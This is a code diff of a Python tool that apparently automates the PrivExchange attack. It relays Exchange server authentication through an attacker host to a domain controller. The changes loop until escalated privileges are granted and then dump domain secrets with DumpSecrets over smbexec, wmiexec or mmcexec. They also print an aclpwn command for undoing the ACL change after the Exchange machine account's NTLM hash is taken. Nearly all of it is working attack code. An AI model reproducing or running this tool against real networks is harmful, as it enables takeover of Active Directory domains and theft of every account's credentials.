@@ -124,10 +124,15 @@ def checkauth(passargs):
             break
         else:
             suc = config.get_suc()
-            tmp = time.time() - start
-            if tmp > 120:
-                logging.error("Time Out. exiting...")
+            fal = config.get_fail()
+            if fal == True:
+                logging.error("Get auth failed, exiting...")
                 break
+            else:
+                tmp = time.time() - start
+                if tmp > passargs.timeout:
+                    logging.error("Time Out. exiting...")
+                    break
                 
 def gethash(passargs):
     remoteName = passargs.target_host
@@ -139,15 +144,28 @@ def gethash(passargs):
         dcuser = passargs.just_dc_user
     else:
         dcuser = None
-    dumper = DumpSecrets(remoteName, username, password, domain,execmethod,dcuser)
-    try:
-        time.sleep(10)
-        check = dumper.dump()
-    except Exception, e:
-        if logging.getLogger().level == logging.DEBUG:
-            import traceback
-            traceback.print_exc()
-        logging.error(e)
+    getpriv = config.get_priv()
+    while True:
+        if getpriv == True:
+            dumper = DumpSecrets(remoteName, username, password, domain,execmethod,dcuser)
+            try:
+                check = dumper.dump()
+                break
+            except Exception, e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                logging.error(e)
+        else:
+            getpriv = config.get_priv()
+
+    restore = config.get_restore()
+    logging.critical("Backup old SD for restore => {}".format(restore))
+    logging.info("Install aclpwn with: pip install aclpwn")
+    logging.info(
+        "You can restore with aclpwn use this command below after dump the NTLM of Exhcange$")
+    logging.critical('Command: aclpwn -r {}'.format(restore))
+
 
 def exploit(args):
     ews_url = "/EWS/Exchange.asmx"
@@ -294,7 +312,8 @@ def main():
     parser.add_argument("-ah", "--attacker-host", required=True, help="Attacker hostname or IP")
     parser.add_argument("-ap", "--attacker-port", default=80, help="Port on which the relay attack runs (default: 80)")
     parser.add_argument("-th", "--target-host", required=True, help="Hostname or IP of the DC")
-    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
+    parser.add_argument("-t", "--timeout", default='120',type=int, help='timeout in seconds')
+    parser.add_argument('--exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                         'method to use at target (only when using -use-vss). Default: smbexec')
     parser.add_argument("--exchange-version",default='Exchange2013',help='Exchange version of the target (default: Exchange2013, choices:Exchange2010,Exchange2010_SP1,Exchange2010_SP2,Exchange2013,Exchange2013_SP1,Exchange2016)',)
     parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
